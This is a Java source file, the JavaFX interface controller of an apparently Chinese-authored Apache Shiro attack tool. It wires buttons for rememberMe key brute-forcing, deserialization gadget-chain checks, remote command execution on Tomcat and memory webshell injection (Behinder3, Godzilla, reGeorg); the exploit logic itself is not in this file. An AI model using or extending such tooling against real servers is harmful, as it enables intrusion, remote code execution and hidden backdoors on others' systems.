package ui;

import core.CommandExecute;
import core.GadgetCheck;
import core.MemInject;
import core.ShiroKeyBrute;
import entity.ControllersFactory;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.*;

import java.net.URL;
import java.util.ResourceBundle;


public class MyController implements Initializable {

    public ShiroKeyBrute shiroKeyBrute = null;
    public GadgetCheck gadgetCheck = null;
    public CommandExecute commandExecute = null;
    public MemInject memInject = null;
    // 运行按钮
    @FXML
    private Button burpKey;

    // 检测按钮
    @FXML
    private Button checkGadget;

    @FXML
    private Button cmdExecute;

    @FXML
    private Button memShellInject;

    @FXML
    private TextField command;

    @FXML
    private TextField attackUrl;

    @FXML
    private TextField postParam;

    @FXML
    private ComboBox<String> httpMethod;

    @FXML
    public TextArea result;

    @FXML
    private ComboBox<String> contentType;

    @FXML
    private TextField customProxy;

    @FXML
    private ComboBox<String> gadget;

    @FXML
    private ComboBox<String> middleWare;

    @FXML
    private ComboBox<String> memShellType;

    @FXML
    public TextField key;

    @FXML
    private CheckBox encryptType;

    @FXML
    private CheckBox outputType;

    @FXML
    private TextField rmbMe;

    @FXML
    private TextField memShellPath;

    @FXML
    private TextField memShellPwd;


    @Override
    public void initialize(URL location, ResourceBundle resources) {
        initComboBox();
        // 将对象存进去
        ControllersFactory.controllers.put(MyController.class.getSimpleName(),this);
        rmbMe.setText("rememberMe");
        memShellPath.setText("/demo.ico");
        memShellPwd.setText("pass");
//        this.result.appendText("ShiroTool code: 天下大木头\n" +
//                "目前实现功能:\n" +
//                "[1] 特征头可修改\n" +
//                "[2] 实现Key的爆破，忽略了SSL证书不可信问题\n" +
//                "[3] 支持post类型以及三种content-type\n");
    }




    // 运行按钮事件
    @FXML
    void burpKey(ActionEvent event) throws Exception {
        // 从控件中获取数值
        String targetUrl = attackUrl.getText();
        String method = httpMethod.getValue();
        String contenttype = contentType.getValue();
        String proxy = customProxy.getText();
        String rememberMe = rmbMe.getText();

        // 存到上下文
        if (rememberMe.length() != 0){
            ControllersFactory.paramsContext.put("rememberMe",rememberMe);
        } else {
            ControllersFactory.paramsContext.put("rememberMe","rememberMe");
        }
        // 选择密钥爆破模式
        setEncryptType();
        setOutputType();
        ControllersFactory.paramsContext.put("Method",method);
        ControllersFactory.paramsContext.put("ContentType",contenttype);
        ControllersFactory.paramsContext.put("PostParam",postParam.getText());
        if (proxy != null){
            ControllersFactory.paramsContext.put("MyProxy",proxy);
        }

        // 这样的话每按一次按钮都重新创建对象
        if (targetUrl.length() != 0){
            this.shiroKeyBrute = new ShiroKeyBrute();
            this.shiroKeyBrute.shiroDetect(targetUrl);
        } else {
            this.result.appendText("[!] URL地址为空\n");
        }
    }

    public void setEncryptType() throws Exception{
        if (encryptType.isSelected()){
            ControllersFactory.paramsContext.put("Encrypt","GCM");
        } else {
            ControllersFactory.paramsContext.put("Encrypt","CBC");
        }
    }

    public void setOutputType() throws Exception{
        if (outputType.isSelected()){
            ControllersFactory.paramsContext.put("OutputType","1");
        }else {
            ControllersFactory.paramsContext.put("OutputType","0");
        }
    }

    // 检测当前利用链
    @FXML
    void checkGadget(ActionEvent event) throws Exception{
        boolean flag = false;
        String shiroKey = ControllersFactory.paramsContext.get("ShiroKey");
        if (shiroKey == null){
            shiroKey = this.key.getText();
        }

        if (shiroKey.length() == 0){
            this.result.appendText("[!] 请先爆破Key或输入Key\n\n");
        }else {
            setOutputType();
            setEncryptType();
            if (middleWare.getValue().equals("Tomcat")){
                String gadget = this.gadget.getValue();
                gadgetCheck = new GadgetCheck();
                flag = gadgetCheck.checkGadget(gadget);
                // 利用成功的链存到successGadget里面
                if (flag == true){
                    ControllersFactory.successGadget.put(this.gadget.getValue(),Class.forName("payloads."+this.gadget.getValue()));
                }
            }else if (middleWare.getValue().equals("Weblogic")){
                this.result.appendText("Weblogic 还没做Orz");
            }
        }
    }


    // 命令注入按钮
    @FXML
    void cmdExecute(ActionEvent event) throws Exception{
        String gadget = this.gadget.getValue();
        String cmd = this.command.getText();
        String midware = this.middleWare.getValue();
        setOutputType();
        setEncryptType();
        if (midware.equals("Tomcat")){
            commandExecute = new CommandExecute();
            commandExecute.tomcatCommandExecute(gadget,cmd);

        }else if (midware.equals("Weblogic")){
            this.result.appendText("Weblogic 还没做Orz");
        }
    }

    // 内存马注入按钮事件
    @FXML
    void memShellInject(ActionEvent event) throws Exception{
        /**
         * 首先检查 shirokey 是否存在上下文中
         * 检查 successgadget 中是否有可利用的利用链
         * 这里需要两个上下文
         * 一个是用来存储内存马中的 loader 加载器 rememberMe
         * 第二个用来存储 内存马中 post 发送的内容
         */
        setOutputType();
        setEncryptType();
        String shiroKey = ControllersFactory.paramsContext.get("ShiroKey");
        if (shiroKey == null){
            shiroKey = this.key.getText();
        }

        if (shiroKey.length() == 0){
            this.result.appendText("[!] 请先爆破Key或输入Key\n\n");
        } else {
            String gadget = this.gadget.getValue();
            Class gadgetClass = ControllersFactory.successGadget.get(gadget);
            if (gadgetClass != null){
                // 获取到可以利用的利用链，获取到了 shirokey，获取到了对应到中间件
                String midware = this.middleWare.getValue();
                String memShellType = this.memShellType.getValue();  // 内存马类型
                ControllersFactory.paramsContext.put("Path",memShellPath.getText());
//                ControllersFactory.paramsContext.put("Password",memShellPwd.getText());
                String password = memShellPwd.getText();
                if (midware.equals("Tomcat")){
                    memInject = new MemInject();
                    // 注入的话是需要获取 path 密码 以及当前的内存马类型
                    // 传入当前选择的 gadget 和 内存马类型
                    memInject.baseInject(gadget,memShellType,password);

                } else if (midware.equals("Weblogic")){
                    this.result.appendText("Weblogic 还没做Orz");
                }

            }else {
                this.result.appendText("[!] 请先获取或检测对应的利用链\n");
            }
        }

    }


    // 下拉控件初始化
    public void initComboBox(){
        ObservableList<String> methods = FXCollections.observableArrayList("GET", "POST");
        httpMethod.setPromptText("GET");
        httpMethod.setValue("GET");
        // 设置combobox 的属性
        httpMethod.setItems(methods);

        httpMethod.setOnAction(event ->{
            if (httpMethod.getValue().equals("POST")){
                contentType.setDisable(false);
                postParam.setDisable(false);
            }

            if (httpMethod.getValue().equals("GET")){
                contentType.setDisable(true);
                postParam.setDisable(true);
            }
            }
        );

        ObservableList<String> contentTypes = FXCollections.observableArrayList("application/x-www-form-urlencoded", "application/json","application/xml");
        contentType.setPromptText("application/x-www-form-urlencoded");
        contentType.setValue("application/x-www-form-urlencoded");
        contentType.setItems(contentTypes);

        ObservableList<String> gadgets = FXCollections.observableArrayList("CommonsBeanutils1_183","CommonsCollectionsK1","CommonsCollections11","CommonsBeanutils1");
        gadget.setPromptText("CommonsBeanutils1_183");
        gadget.setValue("CommonsBeanutils1_183");
        gadget.setItems(gadgets);

        ObservableList<String> middleWares = FXCollections.observableArrayList("Tomcat", "Weblogic");
        middleWare.setPromptText("Tomcat");
        middleWare.setValue("Tomcat");
        middleWare.setItems(middleWares);

        // 内存马类型初始化
        ObservableList<String> memShellTypes = FXCollections.observableArrayList("Behinder3", "Godzilla","reGeorg");
        memShellType.setPromptText("Behinder3");
        memShellType.setValue("Behinder3");
        memShellType.setItems(memShellTypes);

        contentType.setDisable(true);
        postParam.setDisable(true);
    }

    public void initAttack(){
        String targetUrl = attackUrl.getText();
    }

}
